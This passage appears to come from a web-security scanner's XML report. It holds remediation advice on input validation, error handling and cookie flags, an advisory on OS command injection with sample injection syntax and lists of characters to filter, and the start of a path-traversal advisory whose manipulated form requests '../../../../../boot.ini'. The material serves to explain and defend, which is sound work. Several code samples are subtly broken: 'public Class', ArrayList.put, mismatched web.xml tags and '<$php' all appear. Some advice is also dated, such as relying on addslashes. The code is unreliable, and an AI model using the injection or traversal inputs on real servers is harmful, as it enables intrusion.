      // Error is serializable to support code executing in multiple JVMs.
      public Class Error implements Serializable {
          
          // Constructor given a specified error key
          public Error(String key) {
              this(key, null);
          }
          
          // Constructor given a specified error key and array of placeholder objects
          public Error(String key, Object[] values) {
              this.key = key;
              this.values = values;
          }
          
          // Returns the error key
          public String getKey() {
              return this.key;
          }
          
          // Returns the placeholder values
          public Object[] getValues() {
              return this.values;
          }
          
          private String key = null;
          private Object[] values = null;
      }    
</code>
              <br />
              <br />
              <text>- Errors: encapsulates a Collection of errors</text>
              <br />
              <br />
              <code>      // Example: Errors encapsulates the Error objects being reported to the presentation layer.
      // Errors are stored in a HashMap where the key is the bean property name and value is an
      // ArrayList of Error objects.
      public Class Errors implements Serializable {
      
          // Adds an Error object to the Collection of errors for the specified bean property.
          public void addError(String property, Error error) {
              ArrayList propertyErrors = (ArrayList)errors.get(property);
              if (propertyErrors == null) {
                  propertyErrors = new ArrayList();
                  errors.put(property, propertyErrors);
              }
              propertyErrors.put(error);            
          }
          
          // Returns true if there are any errors
          public boolean hasErrors() {
              return (errors.size &gt; 0);
          }
          
          // Returns the Errors for the specified property
          public ArrayList getErrors(String property) {
              return (ArrayList)errors.get(property);
          }
          private HashMap errors = new HashMap();
      }
</code>
              <br />
              <br />
              <text>Using the above framework classes, here is an example to process validation errors of the "user_name" field:</text>
              <br />
              <br />
              <code>  // Example to process validation errors of the "user_name" field.
  Errors errors = new Errors();
  String userName = request.getParameter("user_name");
  // (a) Required validation rule
  if (!Validator.validateRequired(userName)) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED));
  } // (b) Alpha-numeric validation rule
  else if (!Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC));
  }
  else
  {
      // (c) Duplicate check validation rule
      // We assume that there is an existing UserValidationEJB session bean that implements
      // a checkIfDuplicate() method to verify if the user already exists in the database.
      try {
          ...        
          if (UserValidationEJB.checkIfDuplicate(userName)) {
              errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE));
          }
      } catch (RemoteException e) {
          // log the error
          logger.error("Could not validate user for specified userName: " + userName);
          errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE);
      }
  }
  // set the errors object in a request attribute called "errors"
  request.setAttribute("errors", errors);
  ...
</code>
              <br />
              <br />
              <text>[2] Reporting Errors</text>
              <br />
              <text>There are two ways to report web-tier application errors:</text>
              <br />
              <text>(a) Servlet Error Mechanism</text>
              <br />
              <text>(b) JSP Error Mechanism</text>
              <br />
              <br />
              <text>[2-a] Servlet Error Mechanism</text>
              <br />
              <text>A Servlet may report errors by:</text>
              <br />
              <text>- forwarding to the input JSP (having already stored the errors in a request attribute), OR</text>
              <br />
              <text>- calling response.sendError with an HTTP error code argument, OR</text>
              <br />
              <text>- throwing an exception</text>
              <br />
              <br />
              <text>It is good practice to process all known application errors (as described in section [1]), store them in a request attribute, and forward to the input JSP. The input JSP should display the error messages and prompt the user to re-enter the data.  The following example illustrates how to forward to an input JSP (userInput.jsp):</text>
              <br />
              <br />
              <code>  // Example to forward to the userInput.jsp following user validation errors
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd != null) {
      rd.forward(request, response);
  }
</code>
              <br />
              <br />
              <text>If the Servlet cannot forward to a known JSP page, the second option is to report an error using the response.sendError method with HttpServletResponse.SC_INTERNAL_SERVER_ERROR (status code 500) as argument.  Refer to the javadoc of javax.servlet.http.HttpServletResponse for more details on the various HTTP status codes.  Example to return a HTTP error:</text>
              <br />
              <br />
              <code>  // Example to return a HTTP error code
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd == null) {
      // messages is a resource bundle with all message keys and values
      response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR,
                              messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID));
  }
</code>
              <br />
              <br />
              <text>As a last resort, Servlets can throw an exception, which must be a subclass of one of the following classes:</text>
              <br />
              <text>- RuntimeException</text>
              <br />
              <text>- ServletException</text>
              <br />
              <text>- IOException</text>
              <br />
              <br />
              <text>[2-b] JSP Error Mechanism</text>
              <br />
              <text>JSP pages provide a mechanism to handle runtime exceptions by defining an errorPage directive as shown in the following example:</text>
              <br />
              <br />
              <code>      &lt;%@ page errorPage="/errors/userValidation.jsp" %&gt;
</code>
              <br />
              <br />
              <text>Uncaught JSP exceptions are forwarded to the specified errorPage, and the original exception is set in a request parameter called javax.servlet.jsp.jspException.  The error page must include a isErrorPage directive as shown below:</text>
              <br />
              <br />
              <code>      &lt;%@ page isErrorPage="true" %&gt;
</code>
              <br />
              <br />
              <text>The isErrorPage directive causes the "exception" variable to be initialized to the exception object being thrown.</text>
              <br />
              <br />
              <text>[3] Rendering Errors</text>
              <br />
              <text>The J2SE Internationalization APIs provide utility classes for externalizing application resources and formatting messages including:</text>
              <br />
              <br />
              <text>(a) Resource Bundles</text>
              <br />
              <text>(b) Message Formatting</text>
              <br />
              <br />
              <text>[3-a] Resource Bundles</text>
              <br />
              <text>Resource bundles support internationalization by separating localized data from the source code that uses it.  Each resource bundle stores a map of key/value pairs for a specific locale.</text>
              <br />
              <br />
              <text>It is common to use or extend java.util.PropertyResourceBundle, which stores the content in an external properties file as shown in the following example:</text>
              <br />
              <br />
              <code>  ################################################
  # ErrorMessages.properties
  ################################################
  # required user name error message
  error.username.required=User name field is required
  # invalid user name format
  error.username.alphanumeric=User name must be alphanumeric
  # duplicate user name error message
  error.username.duplicate=User name {0} already exists, please choose another one
  ...
</code>
              <br />
              <br />
              <text>Multiple resources can be defined to support different locales (hence the name resource bundle).  For example, ErrorMessages_fr.properties can be defined to support the French member of the bundle family.  If the resource member of the requested locale does not exist, the default member is used.  In the above example, the default resource is ErrorMessages.properties.  Depending on the user's locale, the application (JSP or Servlet) retrieves content from the appropriate resource.</text>
              <br />
              <br />
              <text>[3-b] Message Formatting</text>
              <br />
              <text>The J2SE standard class java.util.MessageFormat provides a generic way to create messages with replacement placeholders.  A MessageFormat object contains a pattern string with embedded format specifiers as shown below:</text>
              <br />
              <br />
              <code>  // Example to show how to format a message using placeholder parameters
  String pattern = "User name {0} already exists, please choose another one";
  String userName = request.getParameter("user_name");
  Object[] args = new Object[1];
  args[0] = userName;
  String message = MessageFormat.format(pattern, args);
</code>
              <br />
              <br />
              <text>Here is a more comprehensive example to render error messages using ResourceBundle and MessageFormat:</text>
              <br />
              <br />
              <code>  // Example to render an error message from a localized ErrorMessages resource (properties file)
  // Utility class to retrieve locale-specific error messages
  public Class ErrorMessageResource {
      
      // Returns the error message for the specified error key in the environment locale
      public String getErrorMessage(String errorKey) {
          return getErrorMessage(errorKey, defaultLocale);
      }
      
      // Returns the error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Locale locale) {
          return getErrorMessage(errorKey, null, locale);
      }
      
      // Returns a formatted error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Object[] args, Locale locale) {    
          // Get localized ErrorMessageResource
          ResourceBundle errorMessageResource = ResourceBundle.getBundle("ErrorMessages", locale);
          // Get localized error message
          String errorMessage = errorMessageResource.getString(errorKey);
          if (args != null) {
              // Format the message using the specified placeholders args
              return MessageFormat.format(errorMessage, args);
          } else {
              return errorMessage;
          }
      }
      
      // default environment locale
      private Locale defaultLocale = Locale.getDefaultLocale();
  }
  ...
  // Get the user's locale
  Locale userLocale = request.getLocale();
  // Check if there were any validation errors
  Errors errors = (Errors)request.getAttribute("errors");
  if (errors != null &amp;&amp; errors.hasErrors()) {
      // iterate through errors and output error messages corresponding to the "user_name" property
      ArrayList userNameErrors = errors.getErrors("user_name");
      ListIterator iterator = userNameErrors.iterator();
      while (iterator.hasNext()) {
          // Get the next error object
          Error error = (Error)iterator.next();
          String errorMessage = ErrorMessageResource.getErrorMessage(error.getKey(), userLocale);
          output.write(errorMessage + "\r\n");
      }
  }
</code>
              <br />
              <br />
              <text>It is recommended to define a custom JSP tag, e.g. displayErrors, to iterate through and render error messages as shown in the above example.</text>
              <br />
              <br />
              <text>[4] Error Mapping</text>
              <br />
              <text>Normally, the Servlet Container will return a default error page corresponding to either the response status code or the exception.  A mapping between the status code or the exception and a web resource may be specified using custom error pages.  It is a good practice to develop static error pages that do not disclose internal error states (by default, most Servlet containers will report internal error messages).  This mapping is configured in the Web Deployment Descriptor (web.xml) as specified in the following example:</text>
              <br />
              <br />
              <code>  &lt;!-- Mapping of HTTP error codes and application exceptions to error pages --&gt;
  &lt;error-page&gt;
    &lt;exception-type&gt;UserValidationException&lt;/exception-type&gt;
    &lt;location&gt;/errors/validationError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
    &lt;error-code&gt;500&lt;/exception-type&gt;
    &lt;location&gt;/errors/internalError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
  ...
  &lt;/error-page&gt;
  ...
</code>
              <br />
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>The two main Java frameworks for server-side validation are:</text>
              <br />
              <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text>
              <br />
              <text>The Jakarta Commons Validator is a Java framework that defines the error handling mechanism as described above.  Validation rules are configured in an XML file that defines input validation rules for form fields and the corresponding validation error keys.  Struts provides internationalization support to build localized applications using resource bundles and message formatting.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using Struts Validator:</text>
              <br />
              <code>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</code>
              <br />
              <br />
              <text>The Struts JSP tag library defines the "errors" tag that conditionally displays a set of accumulated error messages as shown in the following example:</text>
              <br />
              <br />
              <code>  &lt;%@ page language="java" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-html.tld" prefix="html" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-bean.tld" prefix="bean" %&gt;
  &lt;html:html&gt;
  &lt;head&gt;
  &lt;body&gt;
      &lt;html:form action="/logon.do"&gt;    
      &lt;table border="0" width="100%"&gt;
      &lt;tr&gt;
          &lt;th align="right"&gt;
              &lt;html:errors property="username"/&gt;
              &lt;bean:message key="prompt.username"/&gt;
          &lt;/th&gt;
          &lt;td align="left"&gt;
              &lt;html:text property="username" size="16"/&gt;
          &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
      &lt;td align="right"&gt;
          &lt;html:submit&gt;&lt;bean:message key="button.submit"/&gt;&lt;/html:submit&gt;
      &lt;/td&gt;
      &lt;td align="right"&gt;
          &lt;html:reset&gt;&lt;bean:message key="button.reset"/&gt;&lt;/html:reset&gt;
      &lt;/td&gt;
      &lt;/tr&gt;
      &lt;/table&gt;
      &lt;/html:form&gt;
  &lt;/body&gt;
  &lt;/html:html&gt;
</code>
              <br />
              <br />
              <text>[2] JavaServer Faces Technology</text>
              <br />
              <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events, validate input, and support internationalization.</text>
              <br />
              <br />
              <text>The JavaServer Faces API defines the "output_errors" UIOutput Renderer, which displays error messages for an entire page or error messages associated with a specified client identifier.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text>
              <br />
              <code>  &lt;%@ taglib uri="http://java.sun.com/jsf/html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://java.sun.com/jsf/core" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</code>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>Java API 1.3 - </text>
              <link target="http://java.sun.com/j2se/1.3/docs/api/">http://java.sun.com/j2se/1.3/docs/api/</link>
              <br />
              <text>Java API 1.4 - </text>
              <link target="http://java.sun.com/j2se/1.4/docs/api/">http://java.sun.com/j2se/1.4/docs/api/</link>
              <br />
              <text>Java Servlet API 2.3 - </text>
              <link target="http://java.sun.com/products/servlet/2.3/javadoc/">http://java.sun.com/products/servlet/2.3/javadoc/</link>
              <br />
              <text>Java Regular Expression Package - </text>
              <link target="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</link>
              <br />
              <text>Jakarta Validator - </text>
              <link target="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</link>
              <br />
              <text>JavaServer Faces Technology - </text>
              <link target="http://java.sun.com/j2ee/javaserverfaces/">http://java.sun.com/j2ee/javaserverfaces/</link>
            </fixRecommendation>
            <fixRecommendation type="PHP">
              <text>** Filter User Input</text>
              <br />
              <br />
              <text>Before passing any data to a SQL query, it should always be properly filtered with whitelisting techniques.  This cannot be over-emphasized.  Filtering user input will correct many injection flaws before they arrive at the database.</text>
              <br />
              <br />
              <text>** Quote User Input</text>
              <br />
              <br />
              <text>Regardless of data type, it is always a good idea to place single quotes around all user data if this is permitted by the database.  MySQL allows this formatting technique.</text>
              <br />
              <br />
              <text>** Escape the Data Values</text>
              <br />
              <br />
              <text>If you're using MySQL 4.3.0 or newer, you should escape all strings with mysql_real_escape_string().  If you are using an older version of MySQL, you should use the mysql_escape_string() function.  If you are not using MySQL, you might choose to use the specific escaping function for your particular database.  If you are not aware of an escaping function, you might choose to utilize a more generic escaping function such as addslashes().</text>
              <br />
              <br />
              <text>If you're using the PEAR DB database abstraction layer, you can use the DB::quote() method or use a query placeholder like ?, which automatically escapes the value that replaces the placeholder.</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>
              </text>
              <link target="http://ca3.php.net/mysql_real_escape_string">http://ca3.php.net/mysql_real_escape_string</link>
              <br />
              <text>
              </text>
              <link target="http://ca.php.net/mysql_escape_string">http://ca.php.net/mysql_escape_string</link>
              <br />
              <text>
              </text>
              <link target="http://ca.php.net/addslashes">http://ca.php.net/addslashes</link>
              <br />
              <text>
              </text>
              <link target="http://pear.php.net/package-info.php?package=DB">http://pear.php.net/package-info.php?package=DB</link>
              <br />
              <br />
              <br />
              <text>** Input Data Validation:</text>
              <br />
              <br />
              <text>While data validations may be provided as a user convenience on the client-tier, data validation must always be performed on the server-tier.  Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text>
              <br />
              <br />
              <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text>
              <br />
              <text>[1] Required field</text>
              <br />
              <text>[2] Field data type (all HTTP request parameters are Strings by default)</text>
              <br />
              <text>[3] Field length</text>
              <br />
              <text>[4] Field range</text>
              <br />
              <text>[5] Field options</text>
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>[7] Cookie values</text>
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>A good practice is to implement a function or functions that validates each application parameter.  The following sections describe some example checking.</text>
              <br />
              <br />
              <text>[1] Required field</text>
              <br />
              <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces.</text>
              <br />
              <br />
              <text>Example of how to validate required fields:</text>
              <br />
              <br />
              <code>  // PHP example to validate required fields
  function validateRequired($input) {
      ...
      $pass = false;
      if (strlen(trim($input))&gt;0){
          $pass = true;
      }
      return $pass;
      ...
  }
  ...
  if (validateRequired($fieldName)) {
      // fieldName is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <br />
              <text>[2] Field data type</text>
              <br />
              <text>In web applications, input parameters are poorly typed.  For example, all HTTP request parameters or cookie values are of type String.  The developer is responsible for verifying the input is of the correct data type.</text>
              <br />
              <br />
              <text>[3] Field length</text>
              <br />
              <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text>
              <br />
              <br />
              <text>[4] Field range</text>
              <br />
              <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text>
              <br />
              <br />
              <text>[5] Field options</text>
              <br />
              <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options.  Remember that a malicious user can easily modify any option value.  Always validate the selected user value against the allowed options as defined by the functional requirements.</text>
              <br />
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>Always check that user input matches a pattern as defined by the functionality requirements.  For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text>
              <br />
              <text>^[a-zA-Z0-9]+$</text>
              <br />
              <br />
              <text>[7] Cookie value</text>
              <br />
              <text>The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text>
              <br />
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>[8-1] Filter user input</text>
              <br />
              <text>To guard the application against cross-site scripting, the developer should sanitize HTML by converting sensitive characters to their corresponding character entities.  These are the HTML sensitive characters:</text>
              <br />
              <text>&lt; &gt; " ' % ; ) ( &amp; +</text>
              <br />
              <br />
              <text>PHP includes some automatic sanitation utility functions, such as htmlentities():</text>
              <br />
              <br />
              <code>  $input = htmlentities($input, ENT_QUOTES, 'UTF-8');
</code>
              <br />
              <br />
              <text>In addition, in order to avoid UTF-7 variants of Cross-site Scripting, you should explicitly define the Content-Type header of the response, for example:</text>
              <br />
              <br />
              <code>  &lt;?php
  header('Content-Type: text/html; charset=UTF-8');
  ?&gt;
</code>
              <br />
              <br />
              <text>[8-2] Secure the cookie</text>
              <br />
              <br />
              <text>When storing sensitive data in a cookie and transporting it over SSL, make sure that you first set the secure flag of the cookie in the HTTP response. This will instruct the browser to only use that cookie over SSL connections.</text>
              <br />
              <br />
              <text>You can use the following code example, for securing the cookie:</text>
              <br />
              <br />
              <code>  &lt;$php
      $value = "some_value";
      $time = time()+3600;
      $path = "/application/";
      $domain = ".example.com";
      $secure = 1;
      setcookie("CookieName", $value, $time, $path, $domain, $secure, TRUE);
  ?&gt;
</code>
              <br />
              <br />
              <text>In addition, we recommend that you use the HttpOnly flag. When the HttpOnly flag is set to TRUE the cookie will be made accessible only through the HTTP protocol. This means that the cookie won't be accessible by scripting languages, such as JavaScript. This setting can effectly help to reduce identity theft through XSS attacks (although it is not supported by all browsers).</text>
              <br />
              <br />
              <text>The HttpOnly flag was Added in PHP 5.2.0.</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <br />
              <text>[1] Mitigating Cross-site Scripting With HTTP-only Cookies: </text>
              <link target="http://msdn2.microsoft.com/en-us/library/ms533046.aspx">http://msdn2.microsoft.com/en-us/library/ms533046.aspx</link>
              <br />
              <text>[2] PHP Security Consortium: </text>
              <link target="http://phpsec.org/">http://phpsec.org/</link>
              <br />
              <text>[3] PHP &amp; Web Application Security Blog (Chris Shiflett): </text>
              <link target="http://shiflett.org/">http://shiflett.org/</link>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>High</Severity>
        <EntityType>Global</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="attCodeInjectionInSystemCall" Count="1">
        <RemediationID>fix_52000</RemediationID>
        <advisory>
          <name>Parameter System Call Code Injection</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Command Execution: OS Commanding</name>
            <reference>http://www.webappsec.org/projects/threat/classes/os_commanding.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>Some scripts run commands through an operating system call. Sometimes URL parameters are used as a part of the command. In such cases, it may be possible to inject code that will be run on the operating system. Various syntax may be used for such code injection:</text>
            <br />
            <br />
            <indentText> command1 | command2</indentText>
            <indentText> (Use the output of command1 as input to command2 - attack would be "| command")</indentText>
            <br />
            <indentText> command1 &amp;&amp; command2</indentText>
            <indentText> (run command2 if command1's return code is true - attack would be "&amp;&amp; command")</indentText>
            <br />
            <indentText> command1 || command2</indentText>
            <indentText> (run command2 if command1's return code is false - attack would be "|| command")</indentText>
            <indentText> </indentText>
            <text>Sometimes the first command is given in single (') or double (") quotes, so to execute the second command, it is necessary to first escape the quotes.</text>
            <br />
            <br />
            <text>Using these variants, an attacker can try to run arbitrary code on the host machine.</text>
            <br />
          </testTechnicalDescription>
          <causes>
            <cause>Sanitation of hazardous characters was not performed correctly on user input</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to run remote commands on the web server. This usually means complete compromise of the server and its contents</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://www.webappsec.org/projects/threat/classes/os_commanding.shtml">WASC Threat Classification: OS Commanding</link>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=77">CWE-77: Failure to Sanitize Data into a Control Plane ('Command Injection')</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>There are several issues whose remediation lies in sanitizing user input.</text>
              <br />
              <text>By verifying that user input does not contain hazardous characters, it is possible to prevent malicious users from causing your application to execute unintended operations, such as launch arbitrary SQL queries, embed Javascript code to be executed on the client side, run various operating system commands etc.</text>
              <br />
              <br />
              <text>It is advised to filter out all the following characters:</text>
              <br />
              <indentText>   [1] |  (pipe sign)</indentText>
              <indentText>   [2] &amp;  (ampersand sign)</indentText>
              <indentText>   [3] ;  (semicolon sign)</indentText>
              <indentText>   [4] $  (dollar sign)</indentText>
              <indentText>   [5] %  (percent sign)</indentText>
              <indentText>   [6] @  (at sign)</indentText>
              <indentText>   [7] '  (single apostrophe)</indentText>
              <indentText>   [8] "  (quotation mark)</indentText>
              <indentText>   [9] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [10] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [11] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [12] () (parenthesis)</indentText>
              <indentText>   [13] +  (plus sign)</indentText>
              <indentText>   [14] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [15] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [16] ,  (comma sign)</indentText>
              <indentText>   [17] \  (backslash)</indentText>
              <br />
              <br />
              <text>The following sections describe the various issues, their fix recommendations and the hazardous characters that might trigger these issues:</text>
              <br />
              <br />
              <br />
              <text>SQL injection and blind SQL injection:</text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input is valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views. When using stored procedures, use the ADO command object to implement them, so that variables are strongly typed.</text>
              <br />
              <text>C. Sanitize input to exclude context-changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] )  (closing parenthesis)</indentText>
              <indentText>   [6] ;  (semicolon)</indentText>
              <br />
              <br />
              <text>Cross site scripting:</text>
              <br />
              <text>A. Sanitize user input and filter out JavaScript code. We suggest that you filter the following characters:</text>
              <br />
              <indentText>   [1] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] '  (single apostrophe)</indentText>
              <indentText>   [4] %  (percent sign)</indentText>
              <indentText>   [5] ;  (semicolon)</indentText>
              <indentText>   [6] () (parenthesis)</indentText>
              <indentText>   [7] &amp;  (ampersand sign)</indentText>
              <indentText>   [8] +  (plus sign)</indentText>
              <text>B. To fix the &lt;%00script&gt; variant see MS article 821349</text>
              <br />
              <text>C. For UTF-7 attacks:</text>
              <br />
              <indentText>   [-] When possible, it is recommended to enforce a specific charset encoding (using 'Content-Type' header or &lt;meta&gt; tag).</indentText>
              <br />
              <text>HTTP response splitting:</text>
              <br />
              <text>Sanitize user input (at least, such input that is later embedded in HTTP responses).</text>
              <br />
              <text>Make sure that malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <br />
              <text>Remote command execution:</text>
              <br />
              <text>Sanitize input to exclude symbols that are meaningful to the operating system's command execution, such as:</text>
              <br />
              <indentText>    [1] |  (pipe sign)</indentText>
              <indentText>    [2] &amp;  (ampersand sign)</indentText>
              <indentText>    [3] ;  (semicolon sign)</indentText>
              <indentText>   </indentText>
              <br />
              <text>Shell command execution:</text>
              <br />
              <text>A. Never pass unchecked user-input to Perl commands such as: eval(), open(), sysopen(), system().</text>
              <br />
              <text>B. Make sure malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>    [1] $  (dollar sign)</indentText>
              <indentText>    [2] %  (percent sign)</indentText>
              <indentText>    [3] @  (at sign)</indentText>
              <br />
              <br />
              <text>XPath injection:</text>
              <br />
              <text>Sanitize input to exclude context changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   Etc.</indentText>
              <indentText>   </indentText>
              <br />
              <text>LDAP injection:</text>
              <br />
              <text>A. Use positive validation. Alphanumeric filtering (A..Z,a..z,0..9)  is suitable for most LDAP queries.</text>
              <br />
              <text>B. Special LDAP characters which should be filtered out or escaped:</text>
              <br />
              <indentText>   [1] A space or "#" character at the beginning of the string </indentText>
              <indentText>   [2] A space character at the end of the string </indentText>
              <indentText>   [3] ,   (comma sign)</indentText>
              <indentText>   [4] +   (plus sign)</indentText>
              <indentText>   [5] "   (quotation mark)</indentText>
              <indentText>   [6] \   (backslash)</indentText>
              <indentText>   [7] &lt;&gt;  (triangular parenthesis)</indentText>
              <indentText>   [8] ;   (semicolon sign)</indentText>
              <indentText>   [9] ()  (parenthesis)</indentText>
              <br />
              <br />
              <text>MX Injection: </text>
              <br />
              <text>Special MX characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <text>Log Forging: </text>
              <br />
              <text>Special logging characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [3] BS (Backspace, ASCII 0x08)</indentText>
              <br />
              <text>ORM Injection: </text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input are valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views.</text>
              <br />
              <text>C. Use a parameterized queries API</text>
              <br />
              <text>D. Sanitize input to exclude context-changing symbols such as (*):</text>
              <br />
              <indentText>   [1] ' (single apostrophe)</indentText>
              <indentText>   [2] " (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] ) (closing parenthesis)</indentText>
              <indentText>   [6] ; (semicolon)</indentText>
              <indentText> </indentText>
              <indentText>   (*) This applies to SQL. High level query languages may need a different sanitization mechanism.</indentText>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>High</Severity>
        <EntityType>Parameter</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="attFileWin32" Count="1">
        <RemediationID>fix_50160</RemediationID>
        <advisory>
          <name>Windows File Parameter Alteration</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Information Disclosure: Path Traversal</name>
            <reference>http://www.webappsec.org/projects/threat/classes/path_traversal.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>CGI scripts often include parameters that specify a file that is displayed or used as a template. If the filename provided to the script is not validated by the application, an attacker could manipulate this parameter and request other files residing on the server.</text>
            <br />
            <text>Example:</text>
            <br />
            <br />
            <text>[Original HTML Form]</text>
            <br />
            <code>  &lt;FORM METHOD=POST ACTION="/cgi-bin/vulnerable_script.cgi"&gt;
  ...
  &lt;INPUT TYPE=HIDDEN NAME="template" VALUE="/dir1/dir2/template.txt"&gt;
  ...
  &lt;/FORM&gt;
</code>
            <br />
            <text>[Manipulated HTML Form]</text>
            <br />
            <code>  &lt;FORM METHOD=POST ACTION="http://target/cgi-bin/vulnerable_script.cgi"&gt;
  ...
  &lt;INPUT TYPE=HIDDEN NAME="template" VALUE="../../../../../boot.ini"&gt;
  ...
  &lt;/FORM&gt;
</code>
            <br />
